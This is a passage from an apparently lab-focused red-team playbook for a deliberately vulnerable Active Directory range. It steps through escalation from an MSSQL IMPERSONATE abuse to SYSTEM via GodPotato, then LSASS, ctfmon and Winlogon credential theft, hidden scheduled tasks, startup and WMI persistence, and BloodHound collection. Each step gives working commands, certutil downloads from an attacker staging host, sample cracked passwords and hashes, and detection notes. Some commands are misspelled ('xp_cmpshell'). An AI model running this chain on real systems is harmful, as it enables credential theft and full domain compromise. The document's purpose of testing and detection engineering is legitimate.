- **bloodyAD syntax**: `set password` not `set-password`. Check current syntax for your bloodyAD version.

### Reproduction checklist
- [ ] ACE#18 deployed (verify with `Get-Acl` on analyst_t2)
- [ ] SPNs registered on svc_mssql (verify with `setspn -L svc_mssql`)
- [ ] BloodyAD can connect to dc02
- [ ] impacket-getTGT succeeds
- [ ] TGS hash captured (AES256, not RC4)
- [ ] hashcat -m 19700 cracks to `s3rv1c3_MSSQL!`

---

## Mechanics: Phase 3 — Execution (WT041 SQL xp_cmdshell via IMPERSONATE)

**Tested 2026-06-04.** PARTIAL success — svc_mssql is NOT sysadmin, path is via analyst_t1 → IMPERSONATE sa → sysadmin. Full details in `tracker.md` line 154-181.

### Why it works
xp_cmdshell is a SQL Server extended stored procedure that spawns a Windows command shell. When enabled, any SQL user with EXECUTE permission can run OS commands. Combined with:
- **MSSQL running as service account** (often with elevated local privileges)
- **IMPERSONATE permission chains** (one SQL login can impersonate another)
- **xp_cmdshell as sysadmin** = code execution as SQL service account

CADRE's specific path:
1. `svc_mssql` (cracked from Phase 2) connects to mbr01 SQL
2. `svc_mssql` is NOT sysadmin → direct xp_cmdshell fails
3. `analyst_t1` (also cracked from Kerberoast) has IMPERSONATE on `sa`
4. `analyst_t1` connects → EXECUTE AS LOGIN = 'sa' → sysadmin → xp_cmdshell works
5. Command runs as `MSSQL$SQLEXPRESS` service account on mbr01

### Attack commands
```bash
# Step 1 — Connect as svc_mssql (NOT sysadmin)
impacket-mssqlclient child.cadre.local/svc_mssql:'s3rv1c3_MSSQL!'@192.168.77.22 \
    -windows-auth

# Verify not sysadmin
SQL> SELECT SYSTEM_USER
# CHILD\svc_mssql
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
# 0

# Step 2 — Connect as analyst_t1 (has IMPERSONATE on sa)
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
    -windows-auth

# Impersonate sa
SQL> EXECUTE AS LOGIN = 'sa'
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
# 1

# Step 3 — Execute OS command via xp_cmdshell
SQL> EXEC xp_cmdshell 'whoami'
# nt service\mssql$sqlexpress

# Step 4 — Transfer attack tool (e.g., GodPotato for SYSTEM escalation)
SQL> EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.77.60:8080/GodPotato.exe C:\Users\Public\GodPotato.exe'

# Step 5 — Privilege escalation to SYSTEM (Phase 3.5 prerequisite)
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c whoami"'
# nt authority\system  ← SYSTEM achieved
```

### What to expect (success)
```
[*] Encryption required, switching to TLS
SQL> EXEC xp_cmdshell 'whoami'
nt service\mssql$sqlexpress

NULL
```

### What to expect (failure modes)
- **`xp_cmdshell` fails with "permission denied"**: svc_mssql is not sysadmin AND no IMPERSONATE path. Path: try analyst_t1 or other service accounts.
- **`IMPERSONATE` fails**: Wrong user. Verify with `SELECT name FROM sys.database_principals WHERE principal_id > 4`.
- **`certutil` blocked by AV**: Use alternate LOLBAS (mshta, regsvr32, bitsadmin). See Phase 3 alt execution.
- **Connection refused on 1433**: SQL service not running or firewall. Verify with `nmap -p 1433 mbr01`.

### CADRE-specific notes
- **mbr01** has MSSQL 2022 with mixed mode auth (per `09-sql-wsus-verify.yml`)
- **`svc_mssql` is NOT sysadmin** — common misconception. Verified in WT041 testing.
- **`analyst_t1` has IMPERSONATE on `sa`** — set in `09-sql-wsus-verify.yml` (line 91 IMPERSONATE on sa)
- **`analyst_t1` password**: `T13r_An@lyst!` (verifiable in `cadre_passwords.txt`)
- **Target IP**: 192.168.77.22 (mbr01)
- **Tool staging**: Serve tools on `http://192.168.77.60:8080/` (provisioning's Python HTTP server)

### Telemetry fingerprint
- **MSSQL ERRORLOG**: Login events for svc_mssql and analyst_t1
- **WinSec 4624** Type 8 (NetworkCleartext) or Type 9 (NewCredentials) for SQL logins
- **WinSec 4688** (process create): cmd.exe spawned by sqlservr.exe
- **Sysmon EID 1** (process create): cmd.exe parent = sqlservr.exe
- **Sysmon EID 3** (network connect): certutil.exe connecting to 192.168.77.60:8080
- **Endpoint events**: process create chain sqlservr → cmd → certutil

### Detection engineering
- **Suricata SID:1000015**: Already covers Kerberos auth pattern
- **Elastic rule**: `process.parent.name:sqlservr.exe AND process.name:cmd.exe OR certutil.exe` = high signal
- **SQL Audit**: Enable `xp_cmdshell` execution auditing (`EXEC sp_audit_xp_cmdshell`)
- **Sysmon config**: Alert on `cmd.exe` or `powershell.exe` spawned by `sqlservr.exe`

### Common pitfalls
- **Wrong user for impersonate**: Only `analyst_t1` has `IMPERSONATE` on `sa` in CADRE. Other service accounts don't.
- **MSSQL 2022 requires TLS by default**: impacket-mssqlclient will auto-negotiate. Old syntax may fail.
- **`xp_cmdshell` is disabled by default in SQL 2005+**: Verify it's enabled via `09-sql-wsus-verify.yml`.
- **Tool paths**: Use `C:\Users\Public\` (writable by MSSQL service account).
- **Firewall on mbr01**: SQL 1433 must be open. Some hardened configs block it.

### Reproduction checklist
- [ ] Phase 1 complete (intern_blue credential)
- [ ] Phase 2 complete (svc_mssql + analyst_t1 credentials)
- [ ] mbr01 SQL service running (verify with `nmap -p 1433`)
- [ ] xp_cmdshell enabled (verify with `SELECT * FROM sys.configurations WHERE name='xp_cmdshell'`)
- [ ] analyst_t1 can IMPERSONATE sa (verify before exploit)
- [ ] GodPotato or similar priv-esc tool staged on provisioning

---


## Mechanics: Phase 3.5 — Credential Theft from SYSTEM

**Context:** Phase 3 gave us SYSTEM on mbr01 via GodPotato. `analyst_cloud` has auto-logon (Type 2/11 in LSASS) and is in cadre.local (root domain). The goal: extract domain credentials to enable SharpHound + lateral movement.

**Lab security posture (disabled by 04-vulnerabilities.yml):**
- LSASS PPL: **OFF** (RunAsPPL deleted) → LSASS memory readable
- VBS/Credential Guard: **OFF** → no credential isolation
- Auto-logon: **ON** → analyst_cloud has Type 2/11 logon in LSASS

### Mechanics: 3.5F — LSASS Credential Dump (T1003.001) [TESTED 2026-06-04]

**Status:** SAM dump worked, sekurlsa failed (GodPotato token lacks SeDebugPrivilege). Got local hashes only, not domain creds.

#### Why it works
LSASS (Local Security Authority Subsystem Service) is a Windows process that holds authentication secrets in memory:
- `msv1_0.dll`: NTLM hashes for interactive logons
- `wdigest.dll`: Cleartext passwords (when WDigest creds are enabled, default in older Windows)
- `tspkg.dll`: Terminal Server / RDP creds
- `kerberos.dll`: Kerberos tickets + keys
- `livessp.dll`: Live SSP creds
- `cloudap.dll`: Azure AD-joined device tokens

If the attacker can read LSASS process memory, they can extract all these secrets offline with mimikatz/pypykatz. Two sub-techniques:
- **`lsadump::sam`** — reads SAM registry hive directly (NO LSASS read needed). Bypasses PPL + Credential Guard.
- **`sekurlsa::logonpasswords`** — reads LSASS process memory. **Blocked by PPL + Credential Guard** (VTL 1 isolation).

The GodPotato impersonated token does NOT have `SeDebugPrivilege` (the privilege required to OpenProcess on lsass.exe). So `sekurlsa::*` fails. But `lsadump::sam` works because it reads the registry, not the LSASS process.

#### Attack commands
```sql
-- From mssqlclient as analyst_t1 → IMPERSONATE sa (Phase 3 chain)
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp"';

-- If direct fails (token issue), use schtasks as SYSTEM:
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';

-- From Kali — download ls.dmp and extract credentials
pypykatz lsa minidump ls.dmp
# Or: mimikatz # sekurlsa::minidump ls.dmp → sekurlsa::logonpasswords
```

#### What to expect (success)
```
# pypykatz output
== LogonSession ==
authentication_id = 0;500 (500 = Administrator)
    msv :
        Username : Administrator
        NTLM     : e02bc503339d51f71d913c245d35b50b
        SHA1     : 87a7063d4d05d65f0a87bc34bff36f3a64d3f8c11
== LogonSession ==
authentication_id = 0;1001 (1001 = svc.elastic)
    msv :
        Username : svc.elastic
        NTLM     : 310673cc1e1c839f19f55d3ee7417b44
```

#### What to expect (failure modes)
- **procdump fails "Access is denied"**: GodPotato token lacks `SeDebugPrivilege`. Use schtasks-as-SYSTEM workaround.
- **pypykatz returns empty creds**: PPL/Credential Guard enabled. `lsadump::sam` may still work.
- **`mimikatz "ERROR kuhl_m_sekurlsa_acquireLSA"**: can't open LSASS handle. Same SeDebugPrivilege issue.
- **Dump file is empty or corrupt**: procdump killed by AV. Use silent process dump (Sysinternals) or direct `MiniDumpWrite` API.

#### CADRE-specific notes
- **LSASS PPL: OFF** — set by `04-vulnerabilities.yml` (RunAsPPL deleted)
- **VBS/Credential Guard: OFF** — `EnableVirtualizationBasedSecurity=0`
- **GodPotato** is at `C:\Users\Public\GodPotato.exe` on mbr01 (transferred in Phase 3)
- **procdump** transferred via `certutil -urlcache` from `http://192.168.77.60:8080/`
- **Local hashes obtained**: Administrator (RID 500) = `e02bc503339d51f71d913c245d35b50b`, vagrant (RID 1000) same, svc.elastic (RID 1001) = `310673cc1e1c839f19f55d3ee7417b44`
- **Domain creds NOT obtained** — need 3.5A (Winlogon registry) for analyst_cloud plaintext
- **Server 2025 reality**: With PPL ON, `sekurlsa::logonpasswords` is blocked. `lsadump::sam` still works (reads registry, not LSASS).

#### Telemetry fingerprint
- **Sysmon EID 10** (ProcessAccess): suspicious access to lsass.exe (target process)
- **Sysmon EID 1** (ProcessCreate): procdump.exe, mimikatz.exe, pypykatz.py
- **Sysmon EID 11** (FileCreate): `.dmp` file creation in non-standard location
- **WinSec 4663** (file accessed): SAM hive read
- **WinSec 4688** (process create): suspicious children of sqlservr.exe (GodPotato, procdump)
- **Endpoint events**: process create chain (sqlservr → GodPotato → cmd → procdump)

#### Detection engineering
- **Suricata SID: ET TROJAN Possible Backdoor Activity (varies)**: HTTP request for `procdump.exe` from mbr01
- **Elastic rule (planned)**: `process.name:procdump.exe OR mimikatz.exe` with `process.parent.name:sqlservr.exe` = high signal
- **Sysmon config**: Alert on `cmd.exe` parented by `sqlservr.exe` (already in Elastic cadre-e candidates)
- **Credential Guard detection**: VBS service running, PPL active = defender sees defender-side protection
- **LSASS read attempts**: Sysmon EID 10 with GrantedAccess containing `0x1010` (PROCESS_VM_READ) on lsass.exe

#### Common pitfalls
- **SeDebugPrivilege not held by impersonated token**: GodPotato's token lacks it. Use schtasks-as-SYSTEM or use a different privesc that DOES grant SeDebugPrivilege.
- **PPL ON (real Server 2025)**: Use mimikatz driver to bypass PPL (lol driver), or use direct `MiniDumpWrite` syscall.
- **Credential Guard ON**: secrets are in VTL 1, impossible to read. Need to steal TGTs from VTL 0 process memory (leaked creds technique).
- **procdump blocked by AV**: Use `silent process dump` (Sysinternals) or manual `MiniDumpWrite` API.
- **Wrong mimikatz module**: `lsadump::sam` ≠ `sekurlsa::logonpasswords`. SAM = registry, sekurlsa = LSASS memory. SAM works without PPL bypass.

#### Reproduction checklist
- [ ] SYSTEM on mbr01 (Phase 3 chain complete)
- [ ] `04-vulnerabilities.yml` deleted RunAsPPL
- [ ] procdump staged on mbr01
- [ ] ls.dmp downloaded to Kali
- [ ] pypykatz extracts at least SAM hashes
- [ ] (Optional) sekurlsa creds for analyst_cloud extracted

---

### Mechanics: 3.5A — Winlogon Registry (T1552.002) [TESTED 2026-06-04]

**Status:** TESTED — plaintext password extracted: `CADRE\analyst_cloud:Cl0ud_An@lyst!`

#### Why it works
Auto-logon credentials are stored in plaintext in the registry key `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `DefaultUserName` — username
- `DefaultPassword` — plaintext password (if set)
- `DefaultDomainName` — domain

This is misconfiguration discovery, not malware exploitation. Common in:
- Kiosks
- Shared workstations
- Lab environments
- Developers testing auto-logon

CADRE's analyst_cloud is configured with auto-logon (by `06-member-services.yml`) so the password is stored in plaintext.

#### Attack commands
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
-- DefaultUserName    REG_SZ    analyst_cloud

SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
-- DefaultPassword    REG_SZ    Cl0ud_An@lyst!

SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
-- DefaultDomainName    REG_SZ    CADRE
```

#### What to expect (success)
```
DefaultUserName    REG_SZ    analyst_cloud
DefaultPassword    REG_SZ    Cl0ud_An@lyst!
DefaultDomainName    REG_SZ    CADRE
```

#### What to expect (failure modes)
- **`ERROR: Access is denied`**: Need SYSTEM (not impersonated token). Use schtasks-as-SYSTEM.
- **`DefaultPassword` value is empty**: Auto-logon uses different method (e.g., stored credential via LSA).
- **Key doesn't exist**: Auto-logon not configured for this user.

#### CADRE-specific notes
- **analyst_cloud** is in `cadre.local` (root domain), NOT child.cadre.local
- Cross-domain auth works via cadre.local ↔ child.cadre.local forest trust
- **Auto-logon configured** by `06-member-services.yml`
- `analyst_cloud` is in `Remote Desktop Users` local group (RDP allowed on mbr01)
- **Use this credential for**: 3.5B (Scheduled Task as analyst_cloud), 3.5C (RDP), Phase 4 (BloodHound)

#### Telemetry fingerprint
- **Sysmon EID 12/13** (registry): RegQueryValue on Winlogon keys from SYSTEM context
- **WinSec 4663** (file accessed): SAM hive read OR registry hive read

#### Detection engineering
- **Elastic rule (planned)**: `event.code:4663 AND object_name:*Winlogon*` = high signal
- **Sysmon config**: Alert on `reg.exe query` with Winlogon path
- **Defender behavior**: Configuration baseline (any machine with DefaultPassword set in registry is a finding)

#### Common pitfalls
- **DefaultPassword permission**: Only SYSTEM + Administrators can read. Make sure you're elevated.
- **Winlogon key is in HKLM**: Requires local machine, not user context.
- **Cross-domain user**: Winlogon stores `DefaultDomainName` separately from cname — verify both are correct.

#### Reproduction checklist
- [ ] SYSTEM on mbr01
- [ ] analyst_cloud auto-logon configured
- [ ] `reg query` returns DefaultUserName, DefaultPassword, DefaultDomainName
- [ ] Password matches expected `Cl0ud_An@lyst!`

---

### Mechanics: 3.5H — ctfmon.exe Password Extraction (T1003) [TESTED]

**Status:** TESTED — extraction works from SYSTEM. Limitation: analyst_cloud must have typed a password into a CLI tool (PuTTY, WinSCP, MySQL, SSH). Auto-logon doesn't generate typed passwords.

#### Why it works
`ctfmon.exe` (CTF Loader) is NOT a protected process. Unlike LSASS, it has no PPL or Credential Guard protection. Typed passwords persist in ctfmon's process memory AFTER the application that received them closes. Ctfmon doesn't have its own memory sanitizer, so plaintext passwords sit there for minutes/hours.

The key insight: this is an undocumented behavior of Windows. Defenders typically don't monitor ctfmon.exe. Credential Guard doesn't protect typed passwords (only Windows auth secrets).

#### Attack commands
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma ctfmon.exe C:\Users\Public\ctfmon.dmp"';

-- From Kali — search dump for typed passwords
strings ctfmon.dmp | grep -i -E 'pass|login|user|cred' | head -50
```

#### What to expect (success)
```
Welcome1!
MyP@ssw0rd123
sshpass -p 'Pass123'
```

#### What to expect (failure modes)
- **ctfmon.dmp empty**: analyst_cloud hasn't typed a password. Auto-logon doesn't count.
- **Strings returns noise**: Use specialized tools like `pypykatz` or `mimikatz sekurlsa::minidump` even for ctfmon.

#### CADRE-specific notes
- **Limitation**: analyst_cloud must manually type a password into a tool like PuTTY/WinSCP for this to work
- **Test workflow**: RDP as analyst_cloud → open PuTTY → type SSH password → procdump ctfmon.exe → grep dump
- **Worth doing in 3.5C (RDP) flow**: after RDP, exercise CLI tools, then dump ctfmon

#### Telemetry fingerprint
- **Sysmon EID 10** (ProcessAccess): procdump reading ctfmon.exe
- **Sysmon EID 1** (ProcessCreate): procdump.exe
- **Sysmon EID 11** (FileCreate): ctfmon.dmp

#### Detection engineering
- **Sysmon EID 10** on ctfmon.exe is **high signal** — ctfmon is rarely read by other processes
- **Sysmon config**: Alert on `granted_access:0x1010 AND target.process.name:ctfmon.exe`

#### Common pitfalls
- **PPL doesn't matter here** — ctfmon has no PPL, so this works even on hardened systems
- **Credential Guard doesn't matter** — ctfmon creds aren't in VTL 1
- **Auto-logon doesn't generate typed creds** — must manually type into a CLI tool

#### Reproduction checklist
- [ ] analyst_cloud has interactive session
- [ ] analyst_cloud typed a password into a CLI tool
- [ ] procdump ctfmon.exe → ctfmon.dmp
- [ ] strings/grep finds plaintext

---

### Mechanics: 3.5I — Token Impersonation (T1134) [TESTED — FAILED]

**Status:** ❌ FAILED — error 1346 (ERROR_NO_SUCH_LOGON_SESSION). Session isolation + GodPotato token lacks SeDebugPrivilege.

#### Why it failed
Two blockers:
1. **Session isolation**: Server 2025 enforces session boundaries. Session 0 (service) cannot directly access session 1 (interactive) without explicit token manipulation.
2. **GodPotato's impersonated token lacks SeDebugPrivilege**: Required for OpenProcess on a process in another session.

The correct approach (NOT used in our test):
- `incognito.exe` — dedicated token theft tool
- `mimikatz token::elevate` + `token::list` + `token::impersonate` — but needs SYSTEM not impersonated token
- `printspoofer.exe` — abuses RPC/Named Pipe impersonation to get SYSTEM in another session

3.5F (LSASS dump) is more reliable and doesn't need session context.

#### CADRE-specific notes
- Tested 2026-06-04 — PowerShell script failed
- Better alternatives documented above
- Mark this as a negative test result in tracker.md

---

### Mechanics: 3.5B — Scheduled Task as analyst_cloud (T1053.005) [READY]

**Status:** Ready to test. Prereq met: SYSTEM + analyst_cloud:Cl0ud_An@lyst!

#### Why it works
`schtasks /create` with `/ru <user> /rp <password>` creates a scheduled task that runs in the context of the specified user. The task runs as the user (not SYSTEM), giving us code execution as analyst_cloud.

Combined with 3.5A (Winlogon registry) to get analyst_cloud's password, this is the cleanest path to "code execution as analyst_cloud" without interactive session.

#### Attack commands
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';

-- Run the task
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';

-- Invisible variant: delete Security subkey
SQL> EXEC xp_cmpshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CADRE-SharpHound\Security\" /f"';

-- Verify invisible
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /query /tn CADRE-SharpHound"';
-- ERROR: The system cannot find the file specified.
```

#### What to expect (success)
- Task created with SharpHound scheduled
- Task runs as analyst_cloud
- SharpHound output in `C:\Users\analyst_cloud\Documents\`
- After Security subkey delete: `schtasks /query` can't find it but task still runs

#### What to expect (failure modes)
- **`Access is denied`**: /ru /rp requires admin privileges to schedule tasks for other users. GodPotato gives SYSTEM, should work.
- **Task not running**: Check with `schtasks /query /tn CADRE-SharpHound` (before Security delete)
- **SharpHound fails**: Path wrong, SharpHound not at `C:\Tools\`

#### CADRE-specific notes
- analyst_cloud password: `Cl0ud_An@lyst!` (from 3.5A)
- SharpHound staging: needs to be at `C:\Tools\SharpHound.exe` on mbr01 (set by `06-member-services.yml`)
- Output directory: `C:\Users\analyst_cloud\Documents\` (writable by analyst_cloud)
- **The "invisible" variant** deletes Security subkey → task invisible to schtasks/query, Task Scheduler GUI, PowerShell Get-ScheduledTask, Autoruns

#### Telemetry fingerprint
- **WinSec 4698** (scheduled task created): task name, principal
- **WinSec 4699** (scheduled task deleted) — only if cleanup
- **WinSec 4702** (scheduled task updated)
- **WinSec 4624** (logon) for analyst_cloud
- **Sysmon EID 1** (ProcessCreate): SharpHound.exe, schtasks.exe
- **Sysmon EID 12/13** (registry): Schedule\TaskCache modifications

#### Detection engineering
- **Elastic rule (planned)**: `event.code:4698 AND task_name:CADRE-*` = suspicious task creation
- **Sysmon EID 12/13** on `TaskCache\Tree\*\Security` = invisible task variant

#### Common pitfalls
- **Nested quotes in xp_cmdshell**: Use backslash-escaped quotes carefully. Test outside SQL first.
- **SharpHound path**: Must be at exact path specified in `/tr`. Use `C:\Tools\SharpHound.exe`.
- **analyst_cloud profile must exist**: First RDP login (3.5C) creates the profile.

---

### Mechanics: 3.5C — RDP Interactive Session (T1021.001) [STUB]

**Status:** Stub. Tested prerequisite: 3.5A (analyst_cloud credential).

#### Why it works
Cross-domain auth: `xfreerdp /d:CADRE` works because `cadre.local` trusts `child.cadre.local`. The user authenticates against dc01 (root DC) but lands on mbr01 (in child domain) — Kerberos referral handles this.

Type 10 logon (RemoteInteractive) produces the highest-fidelity telemetry for SharpHound. SharpHound's `-c All` requires logged-on session data which only Type 10 produces.

#### Attack command
```bash
xfreerdp /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE /cert-ignore
```

#### CADRE-specific notes
- analyst_cloud in `Remote Desktop Users` on mbr01 (per `06-member-services.yml`)
- RDP firewall rule on mbr01 (port 3389 open)
- Password: `Cl0ud_An@lyst!`

---

### Mechanics: 3.5D — File Detonation (WT063-068) [STUB]

**Status:** Stub. Initial access simulation — not the fastest path.

#### Why it works
SYSTEM drops payload to analyst_cloud's Downloads. analyst_cloud's auto-logon session = console session = payload runs in user context when opened.

#### Attack command
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c echo [payload] > C:\Users\analyst_cloud\Downloads\update.ps1"';
-- analyst_cloud opens the file
```

#### CADRE-specific notes
- WT063 (LNK), WT065 (CHM), WT068 (EXE) variants
- For real cred theft, payload must exfiltrate to Kali HTTP :8080
- Telemetry demo for initial access detection

---

### Mechanics: 3.5E — Logon Trigger via Startup Folder (T1547.001) [STUB]

**Status:** Stub. Alternative to 3.5B for logon-triggered execution.

#### Why it works
Files in `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` execute on next interactive logon. Auto-logon → Startup runs as analyst_cloud.

#### Attack command
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c copy C:\Tools\SharpHound.exe C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sharp.exe"';
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c shutdown /r /t 0"';
-- Reboot → auto-logon → Startup → SharpHound
```

#### CADRE-specific notes
- analyst_cloud profile must exist (verify `C:\Users\analyst_cloud` after first auto-logon)
- Simpler than 3.5B (no schtasks interaction)

---

### Mechanics: 3.5G — Nemesis DPAPI (T1555) [STUB]

**Status:** Stub. Requires saved creds in analyst_cloud profile.

#### Why it works
DPAPI (Data Protection API) encrypts user secrets (browser cookies, saved RDP, WiFi) using a master key derived from the user's password. SYSTEM can extract the masterkey from `%APPDATA%\Microsoft\Protect\<SID>\` and decrypt all DPAPI-protected data.

Nemesis automates the full chain: masterkey extraction → CNG key derivation → Chromium App-Bound encryption bypass.

DPAPI is independent of LSASS PPL and Credential Guard (data-at-rest, not in-memory).

#### Attack command
```bash
# Transfer Nemesis to mbr01 (from Kali)
# Run on mbr01 as SYSTEM
nemesis.exe --browser chrome --output C:\Users\Public\nemesis-out.zip
```

#### CADRE-specific notes
- Prerequisite: analyst_cloud has saved credentials in profile (browser, RDP file)
- Worth testing after 3.5C (RDP) when profile has actual data
- Tool: https://github.com/SpecterOps/Nemesis

---

### Mechanics: 3.5J — WMI Event Subscriptions (T1546.003) [STUB]

**Status:** Stub. Fileless persistence technique.

#### Why it works
WMI (Windows Management Instrumentation) supports event subscriptions: `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding`. SYSTEM can install these to fire on system startup. No disk artifacts, no registry run keys, no scheduled tasks.

#### Attack command
See CAMPAIGNS.md section 3.5J for full PowerShell script.

#### CADRE-specific notes
- Detection requires Sysmon 19/20/21 (WMI filter/consumer/binding events)
- Most labs don't have these enabled
- Fileless = survives reboots, invisible to Autoruns/Run keys/Task Scheduler

---

### Mechanics: 3.5K — LSASS Dump via WerFault (T1003.001) [STUB]

**Status:** Stub. Stealthier alternative to 3.5F procdump.

#### Why it works
WerFaultSecure is Microsoft-signed, so EDR may allow it without flagging. Triggers Windows Error Reporting crash dump of LSASS.

#### Attack command
```sql
SQL> EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\WerFaultSecure.exe -ma -i 1 lsass.exe"';
-- Dump file appears in %LOCALAPPDATA%\CrashDumps\
```

#### CADRE-specific notes
- Compare with 3.5F (procdump) — which is stealthier?
- Tool: iPurple.team source (https://ipurple.team/2025/11/18/lsass-dump-windows-error-reporting/)

---

### Mechanics: 3.5L — LAPS Extraction (T1552.004) [STUB]

**Status:** Stub. Requires ACE permission on LAPS attribute.

#### Why it works
LAPS (Local Administrator Password Solution) stores local admin passwords in AD as `ms-Mcs-AdmPwd` attribute. Any user with `Read` permission can LDAP-query it.

#### Attack command
```bash
# From Kali with domain user creds
ldapsearch -x -H ldap://dc01.cadre.local \
    -D "intern_blue@cadre.local" -w '1nt3rn_Blu3!' \
    -b "DC=cadre,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

#### CADRE-specific notes
- Verify which users have Read on ms-Mcs-AdmPwd via BloodHound (Phase 4)
- New Windows LAPS stores in AD or Azure AD
- Enhancement: DSIternals `Get-ADDBAccount -LapsPasswords` from ntds.dit (post-DCSync)

---

### Mechanics: 3.5M — AAD Connect DPAPI Dump (T1555) [STUB]

**Status:** Stub. Bridge from on-prem to Entra ID (Plan 11).

#### Why it works
Azure AD Connect / Cloud Sync stores MSOL account credentials using DPAPI. SYSTEM on the DC can extract them via adconnectdump. MSOL account has broad permissions in Entra ID — usually Directory Synchronization Accounts or equivalent.

#### Attack command
```bash
# On dc01 as SYSTEM
adconnectdump.exe
# Returns MSOL account + password
# Use ROADtools to authenticate to Entra ID
```

#### CADRE-specific notes
- CADRE has Cloud Sync agent on dc01
- MSOL creds → Entra ID access → cloud-side recon
- Plan 11 (EntraGoat) entry point

---

### Mechanics: 3.5N — UnCanny LPE (T1068, T1574.001) [DEFERRED]

**Status:** 🔬 Deferred — gated on Developer Mode + Samba. Per user 2026-06-19.

#### Why it works
Loose-file AppX registration with UNC `InstalledLocation` → SYSTEM `InstallService.exe` calls `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)`. With Samba (not impacket), DllMain runs as SYSTEM.

Direct SYSTEM from non-admin — bypasses GodPotato chain.

#### CADRE-specific notes
- See Campaign_suggestions.md #82 for full details
- Defer until Developer Mode decision is made

---


## Mechanics: Phase 4 — Discovery (BloodHound + LDAP)

**Status:** Partially tested. BloodHound collections confirmed from child.cadre.local and cadre.local (BH zips on Kali). Session data collection from domain-joined machine not yet executed.

### Why it works
BloodHound is a graph-based AD recon tool. It maps:
- **Users, groups, computers, OUs, GPOs, certificates, trusts** — what's in the directory
- **Sessions, local admin, RDP** — who's logged in where
- **ACLs** (DACL + SACL) — who can do what to whom
- **Delegation** (unconstrained, constrained, RBCD)
- **Group memberships** — direct + nested
- **Trusts** — between forests

BloodHound converts this into a Neo4j graph database. Analysts run Cypher queries to find attack paths (e.g., "shortest path from user X to DA").

#### Two collection modes
- **`-c Group,ACL,Trust`** — LDAP-only, works from non-domain-joined host with any cred
- **`-c All`** — includes session/local data, requires running from domain-joined host as user with local admin on target

CADRE's specific path:
- From Kali (non-domain-joined): `-c Group,ACL,Trust` with `analyst_cloud` credential (Phase 3.5A) — gets all the ACE chains
- From mbr01 (domain-joined) as analyst_cloud: `-c All` — adds session data (who's logged in where)

The "from mbr01 as analyst_cloud" is the natural extension after 3.5B (Scheduled Task) or 3.5C (RDP). With 3.5A's credential, this becomes the Phase 4 entry point.

### Attack commands
```bash
# Step 1 — Collect from Kali (non-domain-joined, LDAP-only)
cd /opt/SharpHound  # or download
./SharpHound -c Group,ACL,Trust \
    -d child.cadre.local \
    --domain-controller 192.168.77.11 \
    --ldapusername analyst_cloud \
    --ldappassword 'Cl0ud_An@lyst!'

# Or via bloodhound-python (Linux)
bloodhound-python -d child.cadre.local -u analyst_cloud@cadre.local \
    -p 'Cl0ud_An@lyst!' -ns 192.168.77.11 -c All

# Step 2 — Collect from mbr01 (domain-joined, full collection)
# First: get analyst_cloud onto mbr01 via schtasks (3.5B) or RDP (3.5C)
# Then: run SharpHound with -c All
SharpHound.exe -c All -d child.cadre.local \
    --outputdirectory C:\Users\analyst_cloud\Documents
```

### What to expect (success)
```
Initializing SharpHound at 11:23 on 6/24/2026
